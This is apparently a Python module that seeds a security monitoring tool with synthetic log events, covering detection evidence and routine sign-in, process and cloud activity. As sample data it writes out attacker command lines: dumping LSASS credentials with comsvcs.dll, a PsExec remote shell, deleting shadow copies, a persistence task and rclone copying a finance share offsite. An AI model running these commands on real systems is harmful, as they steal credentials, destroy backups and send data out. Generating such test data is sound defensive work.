# ruff: noqa: S311  (seeded pseudo-random numbers make the demo data reproducible; nothing secret)
"""Synthetic normalised events for the seed: the evidence behind fixture detections and a few days of ordinary
activity (sign-ins, program starts, cloud calls) so search, hunting and the event river have something to show.
Labelled as sample data (`labels.sample = "true"`)."""

from __future__ import annotations

import hashlib
import random
import uuid
from datetime import datetime, timedelta
from typing import Any

from nightjar import clock
from nightjar.contracts import CloudInfo, Endpoint, HostRef, NormalizedEvent, ProcessInfo, UntrustedText, UserRef
from nightjar.seed.data import HALDEN_ASSETS, HALDEN_IDENTITIES

IPS = {a[0]: a[2][0] for a in HALDEN_ASSETS if a[2]}
HOME = {i[0]: i[9][0] for i in HALDEN_IDENTITIES}
WORKSTATION = {
    "j.okafor": "ant-ws-014",
    "l.peeters": "ant-ws-022",
    "m.bell": "mem-ws-031",
    "a.tanaka": "mel-ws-007",
    "t.reyes": "mem-ws-040",
}


def _eid(org_id: uuid.UUID, *parts: Any) -> str:
    return hashlib.sha256("|".join([str(org_id), *map(str, parts)]).encode()).hexdigest()[:32]


def make_event(
    org_id: uuid.UUID,
    at: datetime,
    *,
    dataset: str,
    action: str,
    category: tuple[str, ...],
    outcome: str = "success",
    message: str,
    host: str | None = None,
    user: str | None = None,
    src: str | None = None,
    src_geo: str | None = None,
    src_as: str | None = None,
    dst: str | None = None,
    process: tuple[str, str] | None = None,
    parent: str | None = None,
    cloud_api: str | None = None,
    access_key: str | None = None,
    nonce: Any = 0,
) -> NormalizedEvent:
    src_ep = Endpoint(ip=src, geo_country=src_geo, as_org=src_as) if src else None
    return NormalizedEvent(
        org_id=org_id,
        event_id=_eid(org_id, dataset, action, at.isoformat(), host, user, nonce),
        timestamp=at,
        ingested_at=clock.now(),
        dataset=dataset,
        kind="event",
        category=category,
        type=("start",),
        action=action,
        outcome=outcome,  # type: ignore[arg-type]
        message=UntrustedText(message, "message"),
        host=HostRef(host, (IPS[host],) if host in IPS else ()) if host else None,
        user=UserRef(user, "HALDEN", f"{user}@halden.example") if user else None,
        source=src_ep,
        destination=Endpoint(ip=dst) if dst else None,
        process=ProcessInfo(
            name=process[0],
            executable=f"C:\\Windows\\System32\\{process[0]}",
            command_line=process[1],
            parent_name=parent,
        )
        if process
        else None,
        cloud=CloudInfo(
            provider="aws",
            account_id="111122223333",
            region="us-east-1",
            service=cloud_api.split(":")[0],
            api=cloud_api,
            access_key_id=access_key,
        )
        if cloud_api
        else None,
        related_ips=tuple(i for i in (src, dst, IPS.get(host or "")) if i),
        related_users=(user,) if user else (),
        related_hosts=(host,) if host else (),
        labels={"sample": "true"},
        raw={"sample": True, "action": action},
    )


def events_for_detection(
    org_id: uuid.UUID, fx: Any, title: str, at: datetime, rng: random.Random
) -> list[NormalizedEvent]:
    """Two or three evidence events matching a fixture detection (shape only; the replay has the real ones)."""
    ents = fx.entities
    host = ents.hosts[0] if ents.hosts else None
    user = ents.users[0] if ents.users else None
    ip = ents.ips[0] if ents.ips else None
    n = rng.getrandbits(32)
    kind = fx.kind
    if kind == "credential_misuse":
        return [
            make_event(
                org_id,
                at,
                dataset="okta.system",
                action="mfa-push-denied",
                category=("authentication",),
                outcome="failure",
                message="User rejected Okta push verify",
                user=user,
                src=ip,
                src_geo="RO",
                src_as="Example Hosting VPS SRL",
                nonce=n,
            ),
            make_event(
                org_id,
                at + timedelta(seconds=40),
                dataset="okta.system",
                action="logon",
                category=("authentication",),
                message="User login to Okta",
                user=user,
                src=ip,
                src_geo="RO",
                src_as="Example Hosting VPS SRL",
                nonce=n,
            ),
        ]
    if kind == "cloud_credential_exposure":
        return [
            make_event(
                org_id,
                at + timedelta(seconds=i * 7),
                dataset="aws.cloudtrail",
                action="s3-get-object",
                category=("file",),
                message="GetObject",
                user="ci-deploy",
                src=ip,
                src_geo="US",
                cloud_api="s3:GetObject",
                access_key=ents.access_keys[0],
                nonce=(n, i),
            )
            for i in range(3)
        ]
    if kind == "brute_force":
        return [
            make_event(
                org_id,
                at + timedelta(seconds=i),
                dataset="vpn.syslog",
                action="logon-failed",
                category=("authentication",),
                outcome="failure",
                message="SSL VPN login failed",
                host="mel-vpn-01",
                user=rng.choice(ents.users),
                src=rng.choice(ents.ips),
                src_geo="NL",
                nonce=(n, i),
            )
            for i in range(3)
        ]
    if kind == "data_exfiltration":
        return [
            make_event(
                org_id,
                at,
                dataset="windows.sysmon",
                action="process-started",
                category=("process",),
                message="Process Create",
                host="mem-ws-040",
                user="t.reyes",
                process=("rclone.exe", "rclone.exe copy \\\\ant-fs-01\\finance remote:backup"),
                nonce=n,
            ),
            make_event(
                org_id,
                at + timedelta(minutes=2),
                dataset="windows.security",
                action="share-accessed",
                category=("file",),
                message="A network share object was accessed",
                host="ant-fs-01",
                user="t.reyes",
                src=IPS["mem-ws-040"],
                nonce=n,
            ),
        ]
    if kind == "benign_activity":
        h = rng.choice(ents.hosts)
        return [
            make_event(
                org_id,
                at,
                dataset="windows.sysmon",
                action="process-started",
                category=("process",),
                message="Process Create",
                host=h,
                user="svc-backup",
                process=("vssadmin.exe", "vssadmin.exe list shadows"),
                parent="HaldenBackupAgent.exe",
                nonce=n,
            ),
        ]
    # ransomware precursor: process and network activity on the servers
    prog = {
        "Sign-in secrets": (
            "rundll32.exe",
            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\d.dmp full",
        ),
        "Remote program": ("PsExec64.exe", "PsExec64.exe \\\\ant-wms-01 -s cmd.exe"),
        "backup copies": ("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet"),
        "scheduled task": ("schtasks.exe", "schtasks.exe /create /tn Updater /tr C:\\ProgramData\\u.exe"),
    }
    proc = next(
        (v for k, v in prog.items() if k in title), ("rundll32.exe", "rundll32.exe C:\\ProgramData\\x.dll,Start")
    )
    target = "ant-wms-01" if "backup copies" in title else (host or "mem-dispatch-01")
    return [
        make_event(
            org_id,
            at,
            dataset="windows.sysmon",
            action="process-started",
            category=("process",),
            message="Process Create",
            host="mem-dispatch-01" if target != "ant-wms-01" else target,
            user="svc-dispatch",
            process=proc,
            nonce=n,
        ),
        make_event(
            org_id,
            at + timedelta(seconds=5),
            dataset="windows.sysmon",
            action="network-connection",
            category=("network",),
            message="Network connection detected",
            host="mem-dispatch-01",
            user="svc-dispatch",
            dst="203.0.113.66",
            nonce=n,
        ),
    ]


def background(org_id: uuid.UUID, *, days: int = 3, seed: int = 20) -> list[NormalizedEvent]:
    """Ordinary working-hours activity over the last `days` days."""
    rng = random.Random(seed)
    now = clock.now()
    people = [i[0] for i in HALDEN_IDENTITIES if i[10] != "service"]
    out: list[NormalizedEvent] = []
    for d in range(days, 0, -1):
        day = now - timedelta(days=d)
        for person in people:
            for k in range(rng.randint(2, 5)):
                t = day.replace(hour=rng.randint(7, 17), minute=rng.randint(0, 59), second=rng.randint(0, 59))
                ok = rng.random() > 0.06
                out.append(
                    make_event(
                        org_id,
                        t,
                        dataset="okta.system",
                        action="logon" if ok else "logon-failed",
                        category=("authentication",),
                        outcome="success" if ok else "failure",
                        message="User login to Okta",
                        user=person,
                        src=f"192.0.2.{rng.randint(20, 90)}",
                        src_geo=HOME.get(person, "BE"),
                        nonce=(d, k),
                    )
                )
            if person in WORKSTATION:
                for k in range(rng.randint(3, 8)):
                    t = day.replace(hour=rng.randint(8, 17), minute=rng.randint(0, 59))
                    prog = rng.choice(["outlook.exe", "excel.exe", "teams.exe", "chrome.exe"])
                    out.append(
                        make_event(
                            org_id,
                            t,
                            dataset="windows.sysmon",
                            action="process-started",
                            category=("process",),
                            message="Process Create",
                            host=WORKSTATION[person],
                            user=person,
                            process=(prog, prog),
                            parent="explorer.exe",
                            nonce=(d, k, prog),
                        )
                    )
        for k in range(rng.randint(20, 40)):
            t = day.replace(hour=rng.randint(0, 23), minute=rng.randint(0, 59))
            out.append(
                make_event(
                    org_id,
                    t,
                    dataset="aws.cloudtrail",
                    action="s3-get-object",
                    category=("file",),
                    message="GetObject",
                    user="ci-deploy",
                    src="192.0.2.15",
                    src_geo="US",
                    cloud_api="s3:GetObject",
                    access_key="AKIAEXAMPLEHALDEN01",
                    nonce=(d, k),
                )
            )
    return out
